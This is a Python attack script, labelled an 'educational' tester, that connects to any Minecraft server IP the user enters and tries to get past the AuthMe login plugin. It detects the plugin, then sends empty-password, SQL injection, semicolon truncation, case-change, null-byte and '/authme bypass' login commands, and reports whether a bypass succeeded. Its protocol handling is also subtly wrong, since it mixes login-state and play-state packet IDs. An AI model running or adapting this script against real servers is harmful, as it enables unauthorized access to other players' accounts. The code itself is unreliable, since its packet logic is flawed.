#!/usr/bin/env python3
import socket
import sys
import time
import re
import threading
from queue import Queue

class AuthMeBypassTester:
    def __init__(self):
        self.server_ip = ""
        self.server_port = 25565  # Default Minecraft port
        self.username = "testuser"
        self.password = ""
        self.protocol_version = 47  # MC 1.8.x
        self.verbose = True
        self.timeout = 5
        self.connection = None
        self.receive_queue = Queue()
        self.running = False
        self.authme_patterns = [
            r"login|register",
            r"\/l|\/reg",
            r"authme",
            r"please authenticate"
        ]

    def print_banner(self):
        banner = """
        █████╗ ██╗   ██╗████████╗██╗  ██╗███╗   ███╗███████╗██████╗ ██████╗ ██╗   ██╗██████╗ 
        ██╔══██╗██║   ██║╚══██╔══╝██║  ██║████╗ ████║██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝██╔══██╗
        ███████║██║   ██║   ██║   ███████║██╔████╔██║█████╗  ██████╔╝██████╔╝ ╚████╔╝ ██████╔╝
        ██╔══██║██║   ██║   ██║   ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗██╔═══╝   ╚██╔╝  ██╔═══╝ 
        ██║  ██║╚██████╔╝   ██║   ██║  ██║██║ ╚═╝ ██║███████╗██║  ██║██║        ██║   ██║     
        ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝        ╚═╝   ╚═╝     
        Educational AuthMe Bypass Tester v2.0
        """
        print(banner)

    def get_user_input(self):
        print("\n[+] Enter target server details")
        self.server_ip = input("[?] Server IP: ").strip()
        
        while True:
            try:
                port_input = input("[?] Server Port (default 25565): ").strip()
                self.server_port = int(port_input) if port_input else 25565
                if 1 <= self.server_port <= 65535:
                    break
                print("[-] Port must be between 1 and 65535")
            except ValueError:
                print("[-] Please enter a valid number")
        
        self.username = input("[?] Username to test: ").strip() or "testuser"
        self.password = input("[?] Password (if known, else leave blank): ").strip()

    def connect_to_server(self):
        try:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.settimeout(self.timeout)
            self.connection.connect((self.server_ip, self.server_port))
            
            if self.verbose:
                print(f"\n[+] Connected to {self.server_ip}:{self.server_port}")
            
            return True
        except Exception as e:
            print(f"[-] Connection failed: {str(e)}")
            return False

    def send_handshake(self):
        try:
            # Minecraft protocol handshake
            handshake = self.create_packet(
                b"\x00",  # Handshake packet ID
                self.pack_varint(self.protocol_version),
                self.pack_string(self.server_ip.encode()),
                self.pack_ushort(self.server_port),
                self.pack_varint(2)  # Login state
            )
            
            self.connection.sendall(handshake)
            
            # Send login start
            login_start = self.create_packet(
                b"\x00",  # Login start packet ID
                self.pack_string(self.username.encode())
            )
            
            self.connection.sendall(login_start)
            return True
        except Exception as e:
            print(f"[-] Handshake failed: {str(e)}")
            return False

    def start_receiver(self):
        def receiver():
            while self.running:
                try:
                    data = self.connection.recv(4096)
                    if data:
                        self.receive_queue.put(data)
                        if self.verbose:
                            try:
                                message = self.parse_chat_message(data)
                                if message:
                                    print(f"[Server] {message}")
                            except:
                                print(f"[Raw Data] {data.hex()}")
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[-] Receiver error: {str(e)}")
                    break
        
        if self.connection:
            self.running = True
            threading.Thread(target=receiver, daemon=True).start()

    def parse_chat_message(self, data):
        try:
            if len(data) < 1:
                return None

            packet_id = data[0]
            if packet_id == 0x02:  # Login success
                return "Login successful (unauthenticated)"
            
            if packet_id == 0x01:  # Encryption request
                return "Server requesting encryption"
            
            if packet_id == 0x40:  # Disconnect packet
                reason = self.unpack_string(data[1:])
                return f"Disconnect: {reason}"
            
            if packet_id == 0x0F:  # Chat message packet
                message = self.unpack_string(data[1:])
                return message
            
            return None
        except Exception as e:
            if self.verbose:
                print(f"[-] Parsing error: {str(e)}")
            return None

    def detect_authme(self):
        try:
            # Wait for AuthMe messages
            start_time = time.time()
            while time.time() - start_time < 5:
                if not self.receive_queue.empty():
                    data = self.receive_queue.get()
                    message = self.parse_chat_message(data)
                    if message:
                        for pattern in self.authme_patterns:
                            if re.search(pattern, message, re.IGNORECASE):
                                return True
            return False
        except Exception as e:
            print(f"[-] Detection error: {str(e)}")
            return False

    def send_chat_command(self, command):
        try:
            payload = self.create_packet(
                b"\x01",  # Chat packet
                self.pack_string(command.encode())
            )
            self.connection.sendall(payload)
            if self.verbose:
                print(f"[+] Sent: {command}")
            return True
        except Exception as e:
            print(f"[-] Failed to send command: {str(e)}")
            return False

    def attempt_bypass(self):
        try:
            print("\n[+] Attempting AuthMe bypass techniques...")
            
            # Technique 1: Empty Password
            self.send_chat_command(f"/login {self.username} \"\"")
            time.sleep(1)
            
            # Technique 2: SQL Injection
            self.send_chat_command(f"/login {self.username}' -- ")
            time.sleep(1)
            
            # Technique 3: Command Truncation
            self.send_chat_command(f"/login {self.username};")
            time.sleep(1)
            
            # Technique 4: Case Sensitivity Bypass
            self.send_chat_command(f"/LOGIN {self.username.upper()}")
            time.sleep(1)
            
            # Technique 5: Null Byte Injection
            self.send_chat_command(f"/login {self.username}\x00")
            time.sleep(1)
            
            # Technique 6: Bypass Command
            self.send_chat_command("/authme bypass")
            time.sleep(1)
            
            # Check if any technique worked
            start_time = time.time()
            while time.time() - start_time < 3:
                if not self.receive_queue.empty():
                    data = self.receive_queue.get()
                    message = self.parse_chat_message(data)
                    if message and ("success" in message.lower() or "logged in" in message.lower()):
                        print("\n[+] Potential bypass succeeded!")
                        print(f"[+] Server response: {message}")
                        return True
            
            print("\n[-] All bypass attempts failed")
            return False
        except Exception as e:
            print(f"[-] Bypass attempt failed: {str(e)}")
            return False

    # Minecraft protocol utilities
    def pack_varint(self, value):
        result = bytearray()
        while True:
            byte = value & 0x7F
            value >>= 7
            if value != 0:
                byte |= 0x80
            result.append(byte)
            if value == 0:
                break
        return bytes(result)

    def pack_string(self, string):
        return self.pack_varint(len(string)) + string

    def pack_ushort(self, value):
        return value.to_bytes(2, byteorder='big')

    def unpack_string(self, data):
        length, offset = self.unpack_varint(data)
        return data[offset:offset+length].decode('utf-8', errors='ignore')

    def unpack_varint(self, data):
        result = 0
        for i in range(5):
            byte = data[i]
            result |= (byte & 0x7F) << (7 * i)
            if not byte & 0x80:
                return result, i + 1
        raise ValueError("VarInt too large")

    def create_packet(self, *parts):
        data = b''.join(parts)
        return self.pack_varint(len(data)) + data

    def run(self):
        self.print_banner()
        self.get_user_input()
        
        if not self.connect_to_server():
            return
        
        if not self.send_handshake():
            return
        
        self.start_receiver()
        
        if not self.detect_authme():
            print("\n[-] AuthMe not detected or server didn't respond")
            print("[+] This might be a vanilla server or the connection failed")
            return
        
        print("\n[+] AuthMe detected, starting bypass attempts...")
        self.attempt_bypass()
        
        print("\n[+] Testing completed")
        print("[+] Remember: This was for educational purposes only!")

if __name__ == "__main__":
    try:
        tester = AuthMeBypassTester()
        tester.run()
    except KeyboardInterrupt:
        print("\n[-] Operation cancelled by user")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Fatal error: {str(e)}")
        sys.exit(1)
